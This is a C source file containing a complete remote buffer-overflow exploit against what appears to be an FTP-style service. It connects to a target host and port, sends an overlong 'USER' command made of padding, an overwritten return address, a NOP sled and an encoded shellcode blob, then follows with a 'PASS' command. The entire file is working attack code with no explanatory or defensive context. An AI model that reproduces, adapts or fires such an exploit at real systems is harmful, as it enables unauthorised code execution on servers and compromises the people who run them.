#include <stdio.h>

#include <netinet/in.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <netdb.h>

int main(int argc, char **argv)

{

struct sockaddr_in addr;

struct hostent *host;

char buffer[1109];

char buffer2[16];
int s, i;

if(argc != 3)

{

fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);

exit(0);

}

s = socket(AF_INET, SOCK_STREAM, 0);

if(s == -1)

{

perror("socket() failed\n");

exit(0);

}

host = gethostbyname(argv[1]);

if( host == NULL)

{

herror("gethostbyname() failed");

exit(0);

}

addr.sin_addr = *(struct in_addr*)host->h_addr;

addr.sin_family = AF_INET;

addr.sin_port = htons(atol(argv[2]));

 

if(connect(s, &addr, sizeof(addr)) == -1)

{

perror("couldn't connect so server\n");

exit(0);

}
char buffRead[2048];
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
char shellcode[] = "\xba\xc1\xdc\xa8\x4f\xdb\xdc\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x47\x83\xc7\x04\x31\x57\x0f\x03\x57\xce\x3e\x5d\xb3\x38\x3c"
"\x9e\x4c\xb8\x21\x16\xa9\x89\x61\x4c\xb9\xb9\x51\x06\xef\x35"
"\x19\x4a\x04\xce\x6f\x43\x2b\x67\xc5\xb5\x02\x78\x76\x85\x05"
"\xfa\x85\xda\xe5\xc3\x45\x2f\xe7\x04\xbb\xc2\xb5\xdd\xb7\x71"
"\x2a\x6a\x8d\x49\xc1\x20\x03\xca\x36\xf0\x22\xfb\xe8\x8b\x7c"
"\xdb\x0b\x58\xf5\x52\x14\xbd\x30\x2c\xaf\x75\xce\xaf\x79\x44"
"\x2f\x03\x44\x69\xc2\x5d\x80\x4d\x3d\x28\xf8\xae\xc0\x2b\x3f"
"\xcd\x1e\xb9\xa4\x75\xd4\x19\x01\x84\x39\xff\xc2\x8a\xf6\x8b"
"\x8d\x8e\x09\x5f\xa6\xaa\x82\x5e\x69\x3b\xd0\x44\xad\x60\x82"
"\xe5\xf4\xcc\x65\x19\xe6\xaf\xda\xbf\x6c\x5d\x0e\xb2\x2e\x09"
"\xe3\xff\xd0\xc9\x6b\x77\xa2\xfb\x34\x23\x2c\xb7\xbd\xed\xab"
"\xb8\x97\x4a\x23\x47\x18\xab\x6d\x83\x4c\xfb\x05\x22\xed\x90"
"\xd5\xcb\x38\x36\x86\x63\x93\xf7\x76\xc3\x43\x90\x9c\xcc\xbc"
"\x80\x9e\x07\xd5\x2b\x64\xcf\x1a\x03\x63\x2d\xf3\x56\x6c\x20"
"\x5f\xde\x8a\x28\x4f\xb6\x05\xc4\xf6\x93\xde\x75\xf6\x09\x9b"
"\xb5\x7c\xbe\x5b\x7b\x75\xcb\x4f\xeb\x75\x86\x32\xbd\x8a\x3c"
"\x58\x41\x1f\xbb\xcb\x16\xb7\xc1\x2a\x50\x18\x39\x19\xeb\x91"
"\xaf\xe2\x83\xdd\x3f\xe3\x53\x88\x55\xe3\x3b\x6c\x0e\xb0\x5e"
"\x73\x9b\xa4\xf3\xe6\x24\x9d\xa0\xa1\x4c\x23\x9f\x86\xd2\xdc"
"\xca\x16\x2e\x0b\x32\x6d\x5e\x8f";

buffer[0] = 'U';
buffer[1] = 'S';
buffer[2] = 'E';
buffer[3] = 'R';
buffer[4] = ' ';

for(i = 5; i < 490 ; i++)

buffer[i] = 'A';

buffer[490] = '\xD7';
buffer[491] = '\x30';
buffer[492] = '\x9D';
buffer[493] = '\x7C';
buffer[494] = 'C';
buffer[495] = 'C';
buffer[496] = 'C';
buffer[497] = 'C';
for (i = 498; i < 793; i++)

buffer[i] = '\x90';

for (i = 0; i < 308; i++)

buffer[i+793] = shellcode[i];

buffer[1101] = '\r';
buffer[1102] = '\n';
buffer[1103] = '\0';
printf("buffer is: %s\n", buffer);

send(s, buffer, strlen(buffer), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);

buffer2[0] = 'P';
buffer2[1] = 'A';
buffer2[2] = 'S';
buffer2[3] = 'S';
buffer2[4] = ' ';
buffer2[5] = 'P';
buffer2[6] = 'A';
buffer2[7] = 'S';
buffer2[8] = 'S';
buffer2[9] = 'W';
buffer2[10] = 'O';
buffer2[11] = 'R';
buffer2[12] = 'D';
buffer2[13] = '\r';
buffer2[14] = '\n';
buffer2[15] = '\0';
send(s, buffer2, strlen(buffer2), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
close(s);

return 0;

}
